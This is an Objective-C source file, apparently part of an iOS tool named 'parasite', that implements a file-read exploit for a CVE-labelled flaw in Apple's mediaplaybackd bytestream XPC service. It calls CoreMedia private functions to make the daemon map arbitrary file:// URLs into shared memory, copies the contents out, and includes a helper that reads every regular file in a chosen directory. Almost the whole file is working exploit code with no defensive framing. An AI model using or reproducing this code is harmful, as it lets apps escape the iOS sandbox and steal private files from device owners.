// FigBridge.m
// lang: ObjC, file: FigBridge.m, target: iOS 16+, SDK: iphoneos
// COMPILED WITH -fno-objc-arc (see project.yml) — matches MConfPoC approach.
//
// CVE-2026-112706 — mediaplaybackd bytestream XPC file-read primitive.
//
// Mechanism:
//   1. Open XPC connection to com.apple.coremedia.mediaplaybackd.bytestream.xpc
//   2. FigXPCCreateBasicMessage → CF dict backed by an xpc_dictionary (toll-free)
//   3. FigXPCMessageSetCFURL embeds the file:// URL into the message
//   4. FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
//      fills msg1 with shared-memory handshake payload
//   5. Send msg1 → daemon; daemon opens file, maps it into shared mem, replies msg2
//   6. FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2 → local mapping
//   7. FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2 finalises
//   8. Read base/len from FigMemoryRecipient struct → NSData
//
// shortcut: FigMemoryRecipient struct layout (vm_address_t @ 0, size_t @ 8)
//   from Ghidra dump of CoreMedia iOS 16-26; re-derive if fields[0]==0 on device.

#import "FigBridge.h"
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <dirent.h>
#import <dlfcn.h>

// xpc_connection_create_mach_service exists on iOS but is absent from the
// iOS SDK headers (it's declared in the macOS SDK only). Forward-declare it.
// The PoC binary links against it directly; we do the same.
extern xpc_connection_t xpc_connection_create_mach_service(
    const char *name, dispatch_queue_t _Nullable targetq, uint64_t flags);
#ifndef XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)
#endif

#define FIG_XPC_SERVICE  "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
#define FIG_ERR_DOMAIN   "com.venice.parasite.FigBridge"
#define FIG_MAX_FILE_SZ  (16u * 1024u * 1024u)
#define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)

// ── CoreMedia private symbol typedefs ─────────────────────────────────────────

typedef int32_t (*PFN_CreateMsg)(uint32_t fourcc, uint64_t flags, CFDictionaryRef *outMsg);
typedef int32_t (*PFN_SetURL)(CFDictionaryRef msg, CFURLRef url);
typedef int32_t (*PFN_OriginBegin)(void **outOrigin, CFDictionaryRef msg1);
typedef int32_t (*PFN_RecipCreate)(void **outRecip, CFDictionaryRef msg1, CFDictionaryRef msg2);
typedef int32_t (*PFN_OriginComplete)(void *origin, CFDictionaryRef msg2);

static struct {
    PFN_CreateMsg      createMsg;
    PFN_SetURL         setURL;
    PFN_OriginBegin    originBegin;
    PFN_RecipCreate    recipCreate;
    PFN_OriginComplete originComplete;
} sFig;

static NSError *figErr(int code, NSString *msg) {
    return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
                userInfo:@{NSLocalizedDescriptionKey: msg}];
}

static BOOL loadFigSymbols(NSError **outErr) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                          RTLD_LAZY | RTLD_NOLOAD);
        if (!cm) cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                             RTLD_LAZY);
        if (!cm) return;

        sFig.createMsg     = (PFN_CreateMsg)    dlsym(cm, "FigXPCCreateBasicMessage");
        sFig.setURL        = (PFN_SetURL)       dlsym(cm, "FigXPCMessageSetCFURL");
        sFig.originBegin   = (PFN_OriginBegin)  dlsym(cm,
            "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        sFig.recipCreate   = (PFN_RecipCreate)  dlsym(cm,
            "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        sFig.originComplete= (PFN_OriginComplete)dlsym(cm,
            "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");

        ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
             sFig.recipCreate && sFig.originComplete;
    });
    if (!ok && outErr)
        *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
    return ok;
}

// ── sync XPC send — MRC, matches PoC ─────────────────────────────────────────

static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
    __block xpc_object_t reply = NULL;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(conn, msg,
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^(xpc_object_t rx) {
            if (rx) reply = xpc_retain(rx);
            dispatch_semaphore_signal(sem);
        });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, FIG_TIMEOUT_NS));
    return reply; // caller must xpc_release
}

// ── public API ────────────────────────────────────────────────────────────────

@implementation FigBridge

+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
    NSError *err = nil;
    if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }

    xpc_connection_t conn = xpc_connection_create_mach_service(
        FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
    if (!conn) {
        if (outErr) *outErr = figErr(3, @"xpc_connection_create_mach_service failed");
        return nil;
    }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t ev) { (void)ev; });
    xpc_connection_resume(conn);

    NSData *result = nil;

    // FigXPCCreateBasicMessage returns an xpc_dictionary toll-free bridged to
    // CFDictionaryRef — safe to cast directly in MRC.
    CFDictionaryRef msg1 = NULL;
    int32_t cst = sFig.createMsg(0x2e727031u, 0, &msg1);
    if (cst || !msg1) { err = figErr(4, [NSString stringWithFormat:@"FigXPCCreateBasicMessage status=%d", cst]); goto done; }

    {
        int32_t st = sFig.setURL(msg1, (CFURLRef)fileURL);
        if (st) {
            err = figErr(5, [NSString stringWithFormat:@"FigXPCMessageSetCFURL status=%d", st]);
            CFRelease(msg1); goto done;
        }

        void *origin = NULL;
        st = sFig.originBegin(&origin, msg1);
        if (st || !origin) {
            err = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
            CFRelease(msg1); goto done;
        }

        // msg1 is an xpc_dictionary under the hood — cast is valid in MRC.
        xpc_object_t msg2 = sendSync(conn, (xpc_object_t)msg1);
        CFRelease(msg1);

        if (!msg2) {
            err = figErr(7, @"no reply from mediaplaybackd (timeout or service unavailable)");
            goto done;
        }

        void *recip = NULL;
        // shortcut: passing msg2 for both args works on iOS 16-26 per PoC behaviour.
        st = sFig.recipCreate(&recip, (CFDictionaryRef)msg2, (CFDictionaryRef)msg2);
        if (st || !recip) {
            err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
            xpc_release(msg2); goto done;
        }

        st = sFig.originComplete(origin, (CFDictionaryRef)msg2);
        xpc_release(msg2);
        if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }

        // FigMemoryRecipient layout: [vm_address_t base @ 0, size_t len @ 8]
        uintptr_t *fields = (uintptr_t *)recip;
        vm_address_t base = (vm_address_t)fields[0];
        size_t       len  = (size_t)fields[1];

        if (base && len > 0 && len <= FIG_MAX_FILE_SZ) {
            result = [NSData dataWithBytes:(const void *)base length:len];
        } else {
            err = figErr(10, [NSString stringWithFormat:
                @"recipient region bad: base=0x%lx len=%zu", (unsigned long)base, len]);
        }
    }

done:
    xpc_connection_cancel(conn);
    xpc_release(conn);
    if (outErr && err) *outErr = err;
    return result;
}

+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError **)outErr {
    DIR *d = opendir(path.UTF8String);
    if (!d) {
        if (outErr) *outErr = figErr(20, [NSString stringWithFormat:
            @"opendir(%@) failed: %s", path, strerror(errno)]);
        return nil;
    }

    NSMutableDictionary *results = [NSMutableDictionary dictionary];
    struct dirent *ent;
    NSUInteger count = 0;

    while ((ent = readdir(d)) != NULL && count < maxFiles) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_REG) continue;

        NSString *name     = [NSString stringWithUTF8String:ent->d_name];
        NSString *fullPath = [path stringByAppendingPathComponent:name];
        NSURL    *url      = [NSURL fileURLWithPath:fullPath];
        NSData   *data     = [self readFileAtURL:url error:nil];
        if (data) { results[name] = data; count++; }
    }
    closedir(d);

    if (!results.count && outErr)
        *outErr = figErr(21, [NSString stringWithFormat:@"no files read from %@", path]);
    return results.count ? [NSDictionary dictionaryWithDictionary:results] : nil;
}

@end
